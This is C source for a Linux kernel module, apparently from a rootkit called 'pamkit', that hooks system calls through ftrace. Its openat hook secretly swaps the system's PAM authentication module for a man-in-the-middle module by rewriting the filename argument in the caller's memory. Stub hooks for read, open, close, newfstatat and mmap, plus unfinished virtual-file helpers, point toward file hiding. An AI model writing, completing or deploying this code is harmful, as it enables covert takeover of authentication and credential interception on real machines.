#include "hook_defs.h"
#include "pam_config.h"
#include "vfile.h"
#include "../util/log.h"

#include <linux/module.h>
#include <linux/ftrace.h>
#include <linux/errno.h>
#include <linux/version.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/fs_struct.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/spinlock.h>
#include <linux/path.h>
#include <linux/dcache.h>
#include <linux/err.h>
#include <linux/stat.h>
#include <linux/fcntl.h>
#include <linux/compiler.h>
#include <linux/mm.h>
#include <linux/mm_types.h>
#include <linux/mman.h>
#include <linux/io.h>

#pragma GCC optimize("-fno-optimize-sibling-calls")

static void *
get_data_from_usr(const void __user *data, const size_t max_size)
{
    void *kbuffer = kzalloc(max_size, GFP_KERNEL);
    if (!kbuffer) {
        prerr_ratelimited("Allocating buffer for copying user data failed");
        return NULL;
    }

    if (copy_from_user(kbuffer, data, max_size)) {
        prerr_ratelimited("Copying user data to kernel buffer failed");
        kfree(kbuffer);
        return NULL;
    }

    return kbuffer;
}

static long
replace_pam_rules_in_buffer(char __user *buffer, const size_t read_bytes, const disk_mod_config_t *disk_mod_config)
{
    // TODO
    return -1;
}

static long
do_virtual_file_read(char __user *buffer, const size_t req_bytes, const vfile_t *virtual_file)
{
    // TODO:
    return -1;
}

SYSCALL_HOOK(read, unsigned int fd, char __user *buf, size_t count)
{
    long ret = SYSCALL_ORIG_READ(pt_regs, fd, buf, count);
    return ret;
}

SYSCALL_HOOK(open, const char __user *filename, int flags, umode_t mode)
{
    long ret = SYSCALL_ORIG_OPEN(pt_regs, filename, flags, mode);
    return ret;
}

static inline int
is_pamkit_target_mod_copy(int dfd, const char *filename)
{
    // libpam (per default) opens the pam modules by its absolute path, so for now
    //  we don't concern ourselves with relative paths
    if (strncmp(filename, TARGET_MOD_COPY_PATH, strlen(TARGET_MOD_COPY_PATH)) == 0) {
        return 1;
    }

    return 0;
}

SYSCALL_HOOK(openat, int dfd, const char __user *filename, int flags, umode_t mode)
{
    long ret;
    int arg_dfd;
    char *arg_filename;
    vf_replacement_rule_t *vf_replacement_rule;
    void __user *userspace_mitm_module_path;

    #ifdef PAMKIT_PTREGS_STUBS
    arg_dfd = FIRST_ARG(pt_regs, int);
    arg_filename = (char *) get_data_from_usr(SECOND_ARG(pt_regs, char*), NAME_MAX * sizeof(char));
    #else
    arg_dfd = dfd;
    arg_filename = (char *) get_data_from_usr(filename, NAME_MAX * sizeof(char));
    #endif

    if (unlikely(!arg_filename)) {
        prerr_ratelimited("Unable to copy user provided filename into kernelspace");
        return SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
    }

    /* Note: For now we heuristically work with the given 'filepath' and never try to resolve the absolute path */

    vf_replacement_rule = get_vf_replacement_rule(current->comm, arg_filename);
    if (unlikely(vf_replacement_rule)) {
        prdebug_ratelimited("Hit a vf replacement rule");
        const virtual_fd_t vfd = get_new_virtual_fd(task_pid_nr(current));
        // TODO: Add a new virtual file state to the map
        kfree(arg_filename);
        return vfd;
    }

    /* Check if the calling process tries to open the PAM module that should be replaced */

    if (likely(!strstr(arg_filename, TARGET_PAM_MODULE_NAME))) {
        goto skip_pam_module_replacement;
    }

    /* Do not intercept calls to open the copy of the PAM module used internally by the MitM module */
    if (is_pamkit_target_mod_copy(arg_dfd, arg_filename)) {
        goto skip_pam_module_replacement;
    }

    userspace_mitm_module_path = (void *) vm_mmap(
        NULL,
        0,
        strlen(MITM_PAM_MODULE_PATH) + 1,
        PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS,
        0
    );

    if (IS_ERR_OR_NULL(userspace_mitm_module_path)) {
        prerr_ratelimited("Failed to allocate userspace buffer holding path to the MitM module");
        goto skip_pam_module_replacement;
    }

    if (copy_to_user(
        userspace_mitm_module_path,
        MITM_PAM_MODULE_PATH,
        strlen(MITM_PAM_MODULE_PATH) + 1
        )
    ) {
        prerr_ratelimited("Failed to write path of the MitM module into userspace allocated buffer");
        vm_munmap((uintptr_t) userspace_mitm_module_path, strlen(MITM_PAM_MODULE_PATH) + 1);
        goto skip_pam_module_replacement;
    }

    #ifdef PAMKIT_PTREGS_STUBS
    ((struct pt_regs *) pt_regs)->si = (unsigned long) userspace_mitm_module_path;
    #else
    *((char __user **) &filename) = (char __user *) userspace_mitm_module_path;
    #endif

    ret = SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
    kfree(arg_filename);
    vm_munmap((uintptr_t) userspace_mitm_module_path, strlen(MITM_PAM_MODULE_PATH) + 1);

    prdebug_ratelimited("Replaced target pam module with the MitM module");
    return ret;

skip_pam_module_replacement:
    kfree(arg_filename);
    return SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
}

SYSCALL_HOOK(newfstatat, int dfd, const char __user *filename, struct stat __user *statbuf, int flag)
{
    long ret = SYSCALL_ORIG_NEWFSTATAT(pt_regs, dfd, filename, statbuf, flag);
    return ret;
}

SYSCALL_HOOK(close, int fd)
{
    long ret = SYSCALL_ORIG_CLOSE(pt_regs, fd);
    return ret;
}

SYSCALL_HOOK(mmap, unsigned long addr, unsigned long len, int prot, int flags, int fd, long off)
{
    long ret = SYSCALL_ORIG_MMAP(pt_regs, addr, len, prot, flags, fd, off);
    return ret;
}

hook_data_t pamkit_syscall_hooks[] = {
    GEN_SYSCALL_HOOK_DATA(read),
    GEN_SYSCALL_HOOK_DATA(open),
    GEN_SYSCALL_HOOK_DATA(openat),
    GEN_SYSCALL_HOOK_DATA(newfstatat),
    GEN_SYSCALL_HOOK_DATA(close),
    GEN_SYSCALL_HOOK_DATA(mmap),
    SYSCALL_HOOK_DATA_EMPTY
};
